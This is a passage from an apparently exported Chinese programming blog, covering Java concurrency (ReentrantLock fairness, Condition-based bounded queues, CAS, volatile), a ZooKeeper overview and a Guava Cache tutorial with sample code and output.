<h4 id="高级特性"><a href="#高级特性" class="headerlink" title="高级特性"></a><em>高级特性</em></h4><p>这里可以直接引用《深入理解Java虚拟机》的描述</p>
<blockquote>
<ul>
<li>等待可中断是指当持有锁的线程长期不释放锁的时候，正在等待的线程可以选择放弃等待，改为处理其他事情，可中断特性对处理执行时间非常长的同步块很有帮助。</li>
<li>公平锁是指多个线程在等待同一个锁时，必须按照申请锁的时间顺序依次获得锁；而非公平锁则不保证这一点，在锁被释放时，任何一个等待锁的线程都有机会获得锁。Sychronized的锁是非公平的，ReentrantLock默认情况下也是非公平的，但可以通过带boolean值的构造函数要求使用公平锁；</li>
<li>锁绑定多个条件是指一个ReentrantLock对象可以同时绑定多个Condition对象，而在Synchronized中，锁对象的wait()和notify()或notifyAll()方法可以实现一个隐含的条件，如果要多于一个条件关联的时候，就不得不额外添加一个锁，而ReentrantLock无需这样做，只需要多次调用newCondition()方法即可。</li>
</ul>
</blockquote>
<h4 id="公平锁正确的打开方式"><a href="#公平锁正确的打开方式" class="headerlink" title="公平锁正确的打开方式"></a><em>公平锁正确的打开方式</em></h4><p>package org.leon.concurent.lock;</p>
<p>import org.junit.Test;</p>
<p>import java.util.ArrayList;<br>import java.util.Collection;<br>import java.util.Collections;<br>import java.util.List;<br>import java.util.concurrent.locks.Lock;<br>import java.util.concurrent.locks.ReentrantLock;</p>
<p>/**<br> * 公平锁和非公平锁区别<br> *<br> * Created by LeonWong on 16/4/28.<br> */<br>public class FairAndUnfairTest {</p>
<pre><code>private static Lock fairLock = new ReentrantLockRev(true);
private static Lock unfairLock = new ReentrantLockRev(false);

@Test
public void fair() &#123;
    testLock(fairLock);
&#125;

@Test
public void unfair() &#123;
    testLock(unfairLock);
&#125;

/\*\*
 \* 启动十个Job
 \*
 \* @param lock
 */
private void testLock(Lock lock) &#123;
    for (int i = 0; i &lt; 10; i++) &#123;
        new Thread(new Job(lock), &quot;Thread-&quot; + i).start();
    &#125;
&#125;

private static class Job extends Thread &#123;
    private Lock lock;

    public Job(Lock lock) &#123;
        this.lock = lock;
    &#125;

    @Override
    public void run() &#123;
        lock.lock();
        try &#123;
            // 连续多次打印当前Tread和队列中的Thread
            for (int i = 0; i &lt; 6; i++) &#123;
                System.out.println(&quot;Lock by \[&#39;&quot; + Thread.currentThread().getName() + &quot;&#39;\]&quot;);
            &#125;
        &#125; finally &#123;
            lock.unlock();
        &#125;
    &#125;
&#125;

private static class ReentrantLockRev extends ReentrantLock &#123;
    public ReentrantLockRev(boolean fair) &#123;
        super(fair);
    &#125;

    // 颠倒列表顺序
    public Collection&lt;Thread&gt; getQueuedThreads() &#123;
        List&lt;Thread&gt; threads = new ArrayList&lt;Thread&gt;(super.getQueuedThreads());
        Collections.reverse(threads);
        return threads;
    &#125;
&#125;</code></pre>
<p>}</p>
<p> </p>
<p>可以发现，使用非公平锁的时候，打印出来的线程名称顺序是乱的；而使用公平锁后，线程名称显示顺序则是按照先进先出的原则打印出来。</p>
<h4 id="绑定条件-–-Condition用法"><a href="#绑定条件-–-Condition用法" class="headerlink" title="绑定条件 – Condition用法"></a><em>绑定条件 – Condition用法</em></h4><p>在jdk1.5以前，线程的等待与唤醒功能，只能通过执行Object自带的notify()和wait()方法实现。来看个简单的栗子</p>
<p>package org.leon.concurent.volatileUsage;</p>
<p>import org.junit.Test;<br>import org.leon.concurent.SleepUtils;</p>
<p>import java.text.SimpleDateFormat;<br>import java.util.Date;</p>
<p>public class WaitAndNotifyDemo {</p>
<pre><code>// 内存可见
private static volatile boolean flag = true;

private static final Object lock = new Object();

@Test
public void doLauncher() throws Exception &#123;
    Thread waitThread = new Thread(new Wait(), &quot;WaitThread&quot;);
    waitThread.start();
    SleepUtils.sleepForSecond(1);
    Thread notifyThread = new Thread(new Notify(), &quot;NotifyThread&quot;);
    notifyThread.start();
    // 防止主线程关闭后导致子线程关闭
    SleepUtils.sleepForSecond(1000000);
&#125;

private static class Wait implements Runnable &#123;
    @Override
    public void run() &#123;
        // 加锁,拥有lock的Monitor
        synchronized (lock) &#123;
            // 当条件不满足时,继续wait,同时释放了lock的锁
            while (flag) &#123;
                try &#123;
                    System.out.println(Thread.currentThread() + &quot; flag is true. wait @ &quot;
                            \+ new SimpleDateFormat(&quot;HH:mm:ss&quot;).format(new Date()));
                    lock.wait();
                &#125; catch (InterruptedException e) &#123;
                    e.printStackTrace();
                &#125;
                System.out.println(Thread.currentThread() + &quot; Thread has been woke!!!!. wait @ &quot;
                        \+ new SimpleDateFormat(&quot;HH:mm:ss&quot;).format(new Date()));
            &#125;
            // 条件满足,完成工作
            System.out.println(Thread.currentThread() + &quot; flag is false. done!!! @ &quot;
                    \+ new SimpleDateFormat(&quot;HH:mm:ss&quot;).format(new Date()));
        &#125;
    &#125;
&#125;

private static class Notify implements Runnable &#123;
    @Override
    public void run() &#123;
        // 加锁,拥有lock的Monitor
        synchronized (lock) &#123;
            // 获取lock的锁,然后进行通知,通知时不会释放lock的锁
            // 直到当前线程释放了lock后,waitThread才能从wait方法中返回
            System.out.println(Thread.currentThread() + &quot; hold lock. notify @ &quot;
                    \+ new SimpleDateFormat(&quot;HH:mm:ss&quot;).format(new Date()));
            System.out.println(Thread.currentThread() + &quot; do notifyAll,but I wanna sleep 4 5 secs. notify @ &quot;
                    \+ new SimpleDateFormat(&quot;HH:mm:ss&quot;).format(new Date()));
            lock.notifyAll();
            flag = false;
            SleepUtils.sleepForSecond(5);
        &#125;
        // 再次加锁
        synchronized (lock) &#123;
            System.out.println(Thread.currentThread() + &quot; hold lock another 5 secs and. notify @ &quot;
                    \+ new SimpleDateFormat(&quot;HH:mm:ss&quot;).format(new Date()));
            SleepUtils.sleepForSecond(5);
        &#125;
    &#125;
&#125;</code></pre>
<p>}</p>
<p>这里要注意的是，执行wait()方法后，线程进入等待状态，并且释放了锁，等待其他线程执行notify()方法将其唤醒。 而Condition的用法与其极其类似，先是从Lock对象中执行newCondition()实例化Condition对象，且允许实例化多个。通过调用await()和notify()方法完成等待唤醒一系列操作，来看个有界阻塞队列的实现。</p>
<p>package org.leon.concurent.condition;</p>
<p>import java.util.concurrent.locks.Condition;<br>import java.util.concurrent.locks.Lock;<br>import java.util.concurrent.locks.ReentrantLock;</p>
<p>/**<br> * 有界阻塞队列<br/><br> * 当队列为空,队列将会阻塞删除并获取操作的线程,直到队列中有新元素;<br/><br> * 当队列已满,队列将会阻塞添加操作的线程，直到队列有空位置；<br> * <p><br> * Created by LeonWong on 16/4/29.<br> */<br>public class BoundedQueue<T> {<br>    private Object[] items;</p>
<pre><code>// 添加的下标,删除的下标和数组当前数量
private int addIndex, removeIndex, count;
private Lock lock = new ReentrantLock();
private Condition notEmpty = lock.newCondition();
private Condition notFull = lock.newCondition();

public BoundedQueue() &#123;
    items = new Object\[5\];
&#125;

public BoundedQueue(int size) &#123;
    items = new Object\[size\];
&#125;

/\*\*
 \* 添加一个元素,数组满则添加线程进入等待状态
 \*
 \* @param t
 \* @throws InterruptedException
 */
public void add(T t) throws InterruptedException &#123;
    lock.lock();
    try &#123;
        while (items.length == count) &#123;
            System.out.println(&quot;添加队列--陷入等待&quot;);
            notFull.await();
        &#125;
        items\[addIndex\] = t;
        addIndex = ++addIndex == items.length ? 0 : addIndex;
        count++;
        notEmpty.signal();
    &#125; finally &#123;
        lock.unlock();
    &#125;
&#125;

/\*\*
 \* 删除并获取一个元素,数组空则进入等待
 \*
 \* @return
 \* @throws InterruptedException
 */
public T remove() throws InterruptedException &#123;
    lock.lock();
    try &#123;
        while (count == 0) &#123;
            System.out.println(&quot;删除队列--陷入等待&quot;);
            notEmpty.await();
        &#125;
        Object tmp = items\[removeIndex\];
        items\[removeIndex\] = null;// 这一步可以有可无
        removeIndex = ++removeIndex == items.length ? 0 : removeIndex;
        count--;
        notFull.signal();
        return (T) tmp;
    &#125; finally &#123;
        lock.unlock();
    &#125;
&#125;

public Object\[\] getItems() &#123;
    return items;
&#125;

public void setItems(Object\[\] items) &#123;
    this.items = items;
&#125;

public int getAddIndex() &#123;
    return addIndex;
&#125;

public void setAddIndex(int addIndex) &#123;
    this.addIndex = addIndex;
&#125;

public int getRemoveIndex() &#123;
    return removeIndex;
&#125;

public void setRemoveIndex(int removeIndex) &#123;
    this.removeIndex = removeIndex;
&#125;

public int getCount() &#123;
    return count;
&#125;

public void setCount(int count) &#123;
    this.count = count;
&#125;</code></pre>
<p>}</p>
<p> </p>
<p>测试用例</p>
<p>package org.leon.concurent.condition;</p>
<p>import org.junit.Test;<br>import org.leon.concurent.SleepUtils;</p>
<p>public class BoundedQueueTest {</p>
<pre><code>/\*\*
 \* 队列初始化size为10
 */
private BoundedQueue&lt;String&gt; boundedQueue = new BoundedQueue&lt;&gt;(10);

@Test
public void testBoundedQueue() throws InterruptedException &#123;
    // 删除队列,起初队列为空,务必陷入等待
    new Thread(new DoRemove()).start();

    SleepUtils.sleepForSecond(2);

    // 添加11条数据入队,队列“有可能”会满,并陷入等待
    for (int i = 0; i &lt; 11; i++) &#123;
        new Thread(new DoAdd()).start();
    &#125;

    System.out.println(&quot;添加队列完毕&quot;);
    SleepUtils.sleepForSecond(4);

    // 再删一次
    boundedQueue.remove();

    SleepUtils.sleepForSecond(2);

    System.out.println(&quot;操作完毕,其中addIndex为&quot; + boundedQueue.getAddIndex() + &quot;,removeIndex为&quot;
            \+ boundedQueue.getRemoveIndex() + &quot;,count为&quot; + boundedQueue.getCount());
&#125;

private class DoRemove implements Runnable &#123;
    @Override
    public void run() &#123;
        try &#123;
            boundedQueue.remove();
        &#125; catch (InterruptedException e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;

private class DoAdd implements Runnable &#123;
    @Override
    public void run() &#123;
        try &#123;
            boundedQueue.add(&quot;Something&quot;);
        &#125; catch (InterruptedException e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;</code></pre>
<p>}</p>
<h4 id="AbstractQueuedSynchronizer（简称AQS）"><a href="#AbstractQueuedSynchronizer（简称AQS）" class="headerlink" title="AbstractQueuedSynchronizer（简称AQS）"></a><em>AbstractQueuedSynchronizer（简称AQS）</em></h4><p>ReentrantLock实现是基于AQS这个抽象方法的，然而篇幅有限，将在下一篇文章里从代码的角度着重探讨。 简单来说，AQS是通过管理状态的方式来实现相对线程安全的。Java中信号量（Semaphore）、读写锁（ReadWriteLock）、计数器（CountDownLatch）以及FutureTask等都是基于AQS实现的，可见这个抽象类的地位多么不一般。</p>
<h4 id="与其说ReentrantLock性能更好不如说Synchronized优化空间更大"><a href="#与其说ReentrantLock性能更好不如说Synchronized优化空间更大" class="headerlink" title="与其说ReentrantLock性能更好不如说Synchronized优化空间更大"></a><em>与其说ReentrantLock性能更好不如说Synchronized优化空间更大</em></h4><p>上面介绍过，Synchronized在JDK1.6以后性能有所增强，因此在能满足业务复杂度需求的情况下，采用Synchronized也未尝不可。然而互斥同步终究属于悲观的并发策略，在对性能要求极高的业务场景下使用以上互斥同步策略并不合适。接下来进而介绍如何实现乐观的同步策略。</p>
<h2 id="Java中的非阻塞同步策略"><a href="#Java中的非阻塞同步策略" class="headerlink" title="Java中的非阻塞同步策略"></a>Java中的非阻塞同步策略</h2><h4 id="CAS指令与原子性"><a href="#CAS指令与原子性" class="headerlink" title="CAS指令与原子性"></a><em>CAS指令与原子性</em></h4><p>原子操作的业务表现形式是“不可被中断或不可被分割操作”。所谓CAS（Compare And Swap）比较并交换就是一种原子操作。简单来说执行CAS需要两个参数，一个新值，一个旧值，当比较内存的值与旧值相符时，则替换为新值，否则不执行替换操作。CPU如何实现，这里不多说，Java若要实现CAS则需要CPU指令集配合，JDK1.5加入了这个特性，并在随后的版本对其进行丰富。</p>
<p>package org.leon.concurent.atomic;</p>
<p>import org.junit.Test;</p>
<p>import java.util.concurrent.atomic.AtomicInteger;</p>
<p>/**<br> * Created by LeonWong on 16/6/10.<br> */<br>public class AtomicItegerUpdaterTest {<br>    private static AtomicInteger couter = new AtomicInteger(0);</p>
<pre><code>@Test
public void doUpdate() &#123;
    couter.compareAndSet(0, 1);
    System.out.println(&quot;结果为&quot; + couter.get());// 结果为1
    couter.compareAndSet(0, 3);
    System.out.println(&quot;结果为&quot; + couter.get());// 结果为1
&#125;</code></pre>
<p>}</p>
<p>除了Integer以外，还支持包括CAS更新实例、更新实例的属性等功能。 阅读源码不难发现，Java是通过一个sun.misc.Unsafe的类，完成CAS指令操作的，然而我们从AQS的源码中也发现了sun.misc.Unsafe类的踪影。</p>
<p>/**<br> * Atomically sets synchronization state to the given updated<br> * value if the current state value equals the expected value.<br> * This operation has memory semantics of a {@code volatile} read<br> * and write.<br> *<br> * @param expect the expected value<br> * @param update the new value<br> * @return {@code true} if successful. False return indicates that the actual<br> *         value was not equal to the expected value.<br> */<br>protected final boolean compareAndSetState(int expect, int update) {<br>    // See below for intrinsics setup to support this<br>    return unsafe.compareAndSwapInt(this, stateOffset, expect, update);<br>}</p>
<p> </p>
<p>其实不难理解，AQS负责管理状态（也可以理解为互斥资源）—— 这里狭义来说可以是锁是否被线程占用的标记，当然，状态的判定规则以及互斥资源数目由AQS的继承者们负责实现，而状态的更新只能是通过CAS指令完成，以确保线程安全。</p>
<h2 id="volatile-关键字"><a href="#volatile-关键字" class="headerlink" title="volatile 关键字"></a>volatile 关键字</h2><p>volatile在多线程环境下保证了共享变量内存可见性。意思就是线程A修改了volatile修饰的共享变量，线程B能够感知修改。如果volatile合理使用的话，将会比Synchronized的执行成本更低。 从底层的角度来说，为了提高处理速度，CPU不直接和内存进行通信，而是先将数据读入到CPU缓存后在进行操作，但不知何时将会更新到内存。声明变量加入volatile关键字后，每次修改该变量，JVM就会通知处理器将CPU缓存内的值强制更新到内存中，这就是所谓的“可见性”。再来看代码。</p>
<p>package org.leon.concurent.volatileUsage;</p>
<p>/**<br> * VolatileDemo 与 SynchronizedDemo 实现效果等价<br> *<br> * Created by LeonWong on 16/6/10.<br> */<br>public class VolatileDemo {<br>    volatile long vl = 0L;</p>
<pre><code>public void set(long l) &#123;
    vl = l;
&#125;

public void getAndIncrement() &#123;
    vl++;
&#125;

public long get() &#123;
    return vl;
&#125;</code></pre>
<p>}</p>
<p>class SynchronizedDemo {<br>    long vl = 0L;</p>
<pre><code>public synchronized void set(long l) &#123;
    vl = l;
&#125;

public void getAndIncrement() &#123;
    long temp = get();
    temp += 1L;
    set(temp);
&#125;

public synchronized long get() &#123;
    return vl;
&#125;</code></pre>
<p>}</p>
<h2 id="无同步策略"><a href="#无同步策略" class="headerlink" title="无同步策略"></a>无同步策略</h2><p>这就比较容易理解了，同步只是线程安全的一个手段，无同步并不意味着线程不安全。大致两种方法的代码可以保证没有使用同步方案的前提下的线程安全。</p>
<ul>
<li>可重入代码。例如纯计算的函数之类的，方法运行间不需要获取外部资源就可以进行计算。</li>
<li>线程本地存储资源。很好理解，线程本地维护自己的资源，根本不存在与其他线程资源冲突的可能。</li>
</ul>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>ZooKeeper简介</title>
    <url>/2017/06/17/zookeeper%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<blockquote>
<h2 id="什么是分布式应用"><a href="#什么是分布式应用" class="headerlink" title="什么是分布式应用"></a>什么是分布式应用</h2><p>分布式应用运行在其上的一组系统被称为『集群』(cluster)，运行在集群中的每个机器被称为『节点』(node)。</p>
<h3 id="分布式应用的优点"><a href="#分布式应用的优点" class="headerlink" title="分布式应用的优点"></a>分布式应用的优点</h3><ul>
<li>可靠性 单机或少量机器的故障不会导致整个系统不可用。</li>
<li>可扩展性 不用停机只需要做很少的配置就可以根据需求通过增加机器来提升系统的性能。</li>
<li>透明性 隐藏了系统的复杂性，对外值暴露单一的入口/应用。</li>
</ul>
<h3 id="分布式应用需要解决的难点"><a href="#分布式应用需要解决的难点" class="headerlink" title="分布式应用需要解决的难点"></a>分布式应用需要解决的难点</h3><ul>
<li>竞争条件 两个或多个机器都尝试去执行同一个任务，而该任务在任意时刻都应该只被一台机器执行。比如，共享的资源在某一时刻应该只能被一台机器修改。</li>
<li>死锁 两个或多个操作无限期的相互等待对方完成。</li>
<li>不一致性 数据的部分错误。</li>
</ul>
</blockquote>
<p>  <strong>zookeeper简介</strong> ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，它包含一个简单的原语集，分布式应用程序可以基于它实现同步服务，配置维护和命名服务等。Zookeeper是hadoop的一个子项目，其发展历程无需赘述。在分布式应用中，由于工程师不能很好地使用锁机制，以及基于消息的协调机制不适合在某些应用中使用，因此需要有一种可靠的、可扩展的、分布式的、可配置的协调机制来统一系统的状态。 在分布式环境中协调和管理一个服务是很复杂的工作，而ZooKeeper用简单的架构和API解决了这个问题，它用<code>fail-safe synchronization</code>机制解决了竞争和死锁的问题, 用<code>atomicity(原子性)</code>解决了数据的一致性问题。它屏蔽了分布式环境中的复杂性，让开发人员可以专注于核心应用功能的开发，而不用去关心分布式环境的太多细节  </p>
<h3 id="ZooKeeper提供的服务"><a href="#ZooKeeper提供的服务" class="headerlink" title="ZooKeeper提供的服务"></a>ZooKeeper提供的服务</h3><ul>
<li>名字服务 在一个集群内根据name找到主机，类似DNS服务</li>
<li>配置管理 集中管理某个节点的最新配置</li>
<li>集群管理 管理一个集群中某一节点的加入和离开</li>
<li>主节点选举 协调一个集群选举中一个新的主节点</li>
<li>加锁和同步服务 在数据被修改时给其加锁，这种机制可以帮助你在连接到其他如HBase的分布式服务时实现自动错误恢复</li>
<li>存放高可用数据 可以保证在一个或多个节点出故障时保证数据的可用性</li>
</ul>
<h3 id="ZooKeeper的优点"><a href="#ZooKeeper的优点" class="headerlink" title="ZooKeeper的优点"></a>ZooKeeper的优点</h3><ul>
<li>简单的分布式协调过程</li>
<li>同步 服务器进程间的互斥和协作</li>
<li>有序的消息</li>
<li>序列化 用指定的规则编码数据。保证你的应用一致的运行。这种方式可以用在MapReduce中来协调对来执行线程</li>
<li>可靠性</li>
<li>原子性 数据传输要么成功要么失败，不存在中间状态</li>
</ul>
<h3 id="ZooKeeper的架构"><a href="#ZooKeeper的架构" class="headerlink" title="ZooKeeper的架构"></a>ZooKeeper的架构</h3><p><img src="http://ww3.sinaimg.cn/large/006y8mN6jw1f7alv0grqej30fw04zdgg.jpg" alt="ZooKeeper架构图"></p>
<p>概念</p>
<p>职责和作用</p>
<p>Client</p>
<p>Client定时向Server发送消息通知Server该Client是alive众泰，同时Server会返回Response给Client，如果Client发送Message后没有收到Response，则会自动重定向到其他Server</p>
<p>Server</p>
<p>ZooKeeper集群中的一个节点，提供给Clients所有的服务</p>
<p>Ensemble</p>
<p>一个可以提供ZooKeeper服务的集群，如果要达到高可用性，至少需要三个节点</p>
<p>Leader</p>
<p>节点故障时执行自动恢复的节点，启动时选举出的</p>
<p>Follower</p>
<p>根据Leader的指示执行任务</p>
<h3 id="ZooKeeper的工作原理"><a href="#ZooKeeper的工作原理" class="headerlink" title="ZooKeeper的工作原理"></a>ZooKeeper的工作原理</h3><p>Zookeeper的核心是原子广播，这个机制保证了各个Server之间的同步。实现这个机制的协议叫做Zab协议。Zab协议有两种模式，它们分别是恢复模式（选主）和广播模式（同步）。当服务启动或者在领导者崩溃后，Zab就进入了恢复模式，当领导者被选举出来，且大多数Server完成了和leader的状态同步以后，恢复模式就结束了。状态同步保证了leader和Server具有相同的系统状态。 为了保证事务的顺序一致性，zookeeper采用了递增的事务id号（zxid）来标识事务。所有的提议（proposal）都在被提出的时候加上了zxid。实现中zxid是一个64位的数字，它高32位是epoch用来标识leader关系是否改变，每次一个leader被选出来，它都会有一个新的epoch，标识当前属于那个leader的统治时期。低32位用于递增计数。 每个Server在工作过程中有三种状态：</p>
<ul>
<li>LOOKING：当前Server不知道leader是谁，正在搜寻</li>
<li>LEADING：当前Server即为选举出来的leader</li>
<li>FOLLOWING：leader已经选举出来，当前Server与之同步</li>
</ul>
]]></content>
      <categories>
        <category>JAVA</category>
        <category>JAVA提高</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>guava缓存应用</title>
    <url>/2017/06/16/guava%E7%BC%93%E5%AD%98%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<blockquote>
<p>       缓存的主要作用是暂时在内存中保存业务系统的数据处理结果，并且等待下次访问使用。在日常开发的很多场合，由于受限于硬盘IO的性能或者我们自身业务系统的数据处理和获取可能非常费时，当我们发现我们的系统这个数据请求量很大的时候，频繁的IO和频繁的逻辑处理会导致硬盘和CPU资源的瓶颈出现。缓存的作用就是将这些来自不易的数据保存在内存中，当有其他线程或者客户端需要查询相同的数据资源时，直接从缓存的内存块中返回数据，这样不但可以提高系统的响应时间，同时也可以节省对这些数据的处理流程的资源消耗，整体上来说，系统性能会有大大的提升。</p>
</blockquote>
<p>缓存在很多系统和架构中都用广泛的应用,例如： 1.CPU缓存 2.操作系统缓存 3.本地缓存 4.分布式缓存 5.HTTP缓存 6.数据库缓存 等等，可以说在计算机和网络领域，缓存无处不在。可以这么说，只要有硬件性能不对等，涉及到网络传输的地方都会有缓存的身影。 Guava Cache是一个全内存的本地缓存实现，它提供了线程安全的实现机制。整体上来说Guava cache 是本地缓存的不二之选，简单易用，性能好。 <strong>Guava Cache有两种创建方式：</strong> 1. cacheLoader 2. callable callback 通过这两种方法创建的cache，和通常用map来缓存的做法比，不同在于，这两种方法都实现了一种逻辑——从缓存中取key X的值，如果该值已经缓存过了，则返回缓存中的值，如果没有缓存过，可以通过某个方法来获取这个值。但不同的在于cacheloader的定义比较宽泛，是针对整个cache定义的，可以认为是统一的根据key值load value的方法。而callable的方式较为灵活，允许你在get的时候指定。 <strong>cacheLoader方式实现实例：</strong></p>
<pre><code>@Test
public void TestLoadingCache() throws Exception&#123;
    LoadingCache&lt;String,String&gt; cahceBuilder=CacheBuilder
    .newBuilder()
    .build(new CacheLoader&lt;String, String&gt;()&#123;
        @Override
        public String load(String key) throws Exception &#123;        
            String strProValue=&quot;hello &quot;+key+&quot;!&quot;;                
            return strProValue;
        &#125;

    &#125;);        

    System.out.println(&quot;jerry value:&quot;+cahceBuilder.apply(&quot;jerry&quot;));
    System.out.println(&quot;jerry value:&quot;+cahceBuilder.get(&quot;jerry&quot;));
    System.out.println(&quot;peida value:&quot;+cahceBuilder.get(&quot;peida&quot;));
    System.out.println(&quot;peida value:&quot;+cahceBuilder.apply(&quot;peida&quot;));
    System.out.println(&quot;lisa value:&quot;+cahceBuilder.apply(&quot;lisa&quot;));
    cahceBuilder.put(&quot;harry&quot;, &quot;ssdded&quot;);
    System.out.println(&quot;harry value:&quot;+cahceBuilder.get(&quot;harry&quot;));
&#125;</code></pre>
<p> </p>
<p>输出： </p>
<p>jerry value:hello jerry!<br>jerry value:hello jerry!<br>peida value:hello peida!<br>peida value:hello peida!<br>lisa value:hello lisa!<br>harry value:ssdded</p>
<p><strong>callable callback的实现：</strong></p>
<pre><code>@Test
public void testcallableCache()throws Exception&#123;
    Cache&lt;String, String&gt; cache = CacheBuilder.newBuilder().maximumSize(1000).build();  
    String resultVal = cache.get(&quot;jerry&quot;, new Callable&lt;String&gt;() &#123;  
        public String call() &#123;  
            String strProValue=&quot;hello &quot;+&quot;jerry&quot;+&quot;!&quot;;                
            return strProValue;
        &#125;  
    &#125;);  
    System.out.println(&quot;jerry value : &quot; + resultVal);

    resultVal = cache.get(&quot;peida&quot;, new Callable&lt;String&gt;() &#123;  
        public String call() &#123;  
            String strProValue=&quot;hello &quot;+&quot;peida&quot;+&quot;!&quot;;                
            return strProValue;
        &#125;  
    &#125;);  
    System.out.println(&quot;peida value : &quot; + resultVal);  
&#125;</code></pre>
<p>　　输出：<br>　　jerry value : hello jerry!<br>　　peida value : hello peida!</p>
<p><strong>cache的参数说明：</strong> 回收的参数： 1. 大小的设置：CacheBuilder.maximumSize(long)  CacheBuilder.weigher(Weigher)  CacheBuilder.maxumumWeigher(long) 2. 时间：expireAfterAccess(long, TimeUnit) expireAfterWrite(long, TimeUnit) 3. 引用：CacheBuilder.weakKeys() CacheBuilder.weakValues()  CacheBuilder.softValues() 4. 明确的删除：invalidate(key)  invalidateAll(keys)  invalidateAll() 5. 删除监听器：CacheBuilder.removalListener(RemovalListener) refresh机制： 1. LoadingCache.refresh(K)  在生成新的value的时候，旧的value依然会被使用。 2. CacheLoader.reload(K, V) 生成新的value过程中允许使用旧的value 3. CacheBuilder.refreshAfterWrite(long, TimeUnit) 自动刷新cache 基于泛型的实现：</p>
<pre><code>/\*\*
 \* 不需要延迟处理(泛型的方式封装)
 \* @return
 */
public  &lt;K , V&gt; LoadingCache&lt;K , V&gt; cached(CacheLoader&lt;K , V&gt; cacheLoader) &#123;
      LoadingCache&lt;K , V&gt; cache = CacheBuilder
      .newBuilder()
      .maximumSize(2)
      .weakKeys()
      .softValues()
      .refreshAfterWrite(120, TimeUnit.SECONDS)
      .expireAfterWrite(10, TimeUnit.MINUTES)        
      .removalListener(new RemovalListener&lt;K, V&gt;()&#123;
        @Override
        public void onRemoval(RemovalNotification&lt;K, V&gt; rn) &#123;
            System.out.println(rn.getKey()+&quot;被移除&quot;);  

        &#125;&#125;)
      .build(cacheLoader);
      return cache;
&#125;

/\*\*
 \* 通过key获取value
 \* 调用方式 commonCache.get(key) ; return String
 \* @param key
 \* @return
 \* @throws Exception
 */

public  LoadingCache&lt;String , String&gt; commonCache(final String key) throws Exception&#123;
    LoadingCache&lt;String , String&gt; commonCache= cached(new CacheLoader&lt;String , String&gt;()&#123;
            @Override
            public String load(String key) throws Exception &#123;
                return &quot;hello &quot;+key+&quot;!&quot;;    
            &#125;
      &#125;);
    return commonCache;
&#125;

@Test
public void testCache() throws Exception&#123;
    LoadingCache&lt;String , String&gt; commonCache=commonCache(&quot;peida&quot;);
    System.out.println(&quot;peida:&quot;+commonCache.get(&quot;peida&quot;));
    commonCache.apply(&quot;harry&quot;);
    System.out.println(&quot;harry:&quot;+commonCache.get(&quot;harry&quot;));
    commonCache.apply(&quot;lisa&quot;);
    System.out.println(&quot;lisa:&quot;+commonCache.get(&quot;lisa&quot;));
&#125;</code></pre>
<p>输出：</p>
<p>peida:hello peida!<br>harry:hello harry!<br>peida被移除<br>lisa:hello lisa!</p>
<p>基于泛型的Callable Cache实现：</p>
<pre><code>private static Cache&lt;String, String&gt; cacheFormCallable = null; 


/\*\*
 \* 对需要延迟处理的可以采用这个机制；(泛型的方式封装)
 \* @param &lt;K&gt;
 \* @param &lt;V&gt;
 \* @param key
 \* @param callable
 \* @return V
 \* @throws Exception
 */
public static &lt;K,V&gt; Cache&lt;K , V&gt; callableCached() throws Exception &#123;
      Cache&lt;K, V&gt; cache = CacheBuilder
      .newBuilder()
      .maximumSize(10000)
      .expireAfterWrite(10, TimeUnit.MINUTES)
      .build();
      return cache;
&#125;


private String getCallableCache(final String userName) &#123;
       try &#123;
         //Callable只有在缓存值不存在时，才会调用
         return cacheFormCallable.get(userName, new Callable&lt;String&gt;() &#123;
            @Override
            public String call() throws Exception &#123;
                System.out.println(userName+&quot; from db&quot;);
                return &quot;hello &quot;+userName+&quot;!&quot;;
           &#125;
          &#125;);
       &#125; catch (ExecutionException e) &#123;
          e.printStackTrace();
          return null;
        &#125; 
&#125;

@Test
public void testCallableCache() throws Exception&#123;
     final String u1name = &quot;peida&quot;;
     final String u2name = &quot;jerry&quot;; 
     final String u3name = &quot;lisa&quot;; 
     cacheFormCallable=callableCached();
     System.out.println(&quot;peida:&quot;+getCallableCache(u1name));
     System.out.println(&quot;jerry:&quot;+getCallableCache(u2name));
     System.out.println(&quot;lisa:&quot;+getCallableCache(u3name));
     System.out.println(&quot;peida:&quot;+getCallableCache(u1name));

&#125;</code></pre>
<p>输出：</p>
<p>peida from db<br>peida:hello peida!<br>jerry from db<br>jerry:hello jerry!<br>lisa from db<br>lisa:hello lisa!<br>peida:hello peida!</p>
<p>说明：Callable只有在缓存值不存在时，才会调用，比如第二次调用getCallableCache(u1name)直接返回缓存中的值 <strong>guava Cache数据移除：</strong> guava做cache时候数据的移除方式，在guava中数据的移除分为被动移除和主动移除两种。 被动移除数据的方式，guava默认提供了三种方式： 1.基于大小的移除:看字面意思就知道就是按照缓存的大小来移除，如果即将到达指定的大小，那就会把不常用的键值对从cache中移除。 定义的方式一般为 CacheBuilder.maximumSize(long)，还有一种一种可以算权重的方法，个人认为实际使用中不太用到。就这个常用的来看有几个注意点， 其一，这个size指的是cache中的条目数，不是内存大小或是其他； 其二，并不是完全到了指定的size系统才开始移除不常用的数据的，而是接近这个size的时候系统就会开始做移除的动作； 其三，如果一个键值对已经从缓存中被移除了，你再次请求访问的时候，如果cachebuild是使用cacheloader方式的，那依然还是会从cacheloader中再取一次值，如果这样还没有，就会抛出异常 2.基于时间的移除：guava提供了两个基于时间移除的方法 expireAfterAccess(long, TimeUnit)  这个方法是根据某个键值对最后一次访问之后多少时间后移除 expireAfterWrite(long, TimeUnit)  这个方法是根据某个键值对被创建或值被替换后多少时间移除 3.基于引用的移除： 这种移除方式主要是基于java的垃圾回收机制，根据键或者值的引用关系决定移除 <strong>主动移除数据方式，主动移除有三种方法：</strong> 1.单独移除用 Cache.invalidate(key) 2.批量移除用 Cache.invalidateAll(keys) 3.移除所有用 Cache.invalidateAll() 如果需要在移除数据的时候有所动作还可以定义Removal Listener，但是有点需要注意的是默认Removal Listener中的行为是和移除动作同步执行的，如果需要改成异步形式，可以考虑使用RemovalListeners.asynchronous(RemovalListener, Executor)</p>
]]></content>
      <categories>
        <category>JAVA</category>
        <category>JAVA提高</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>kafka不能远程连接问题</title>
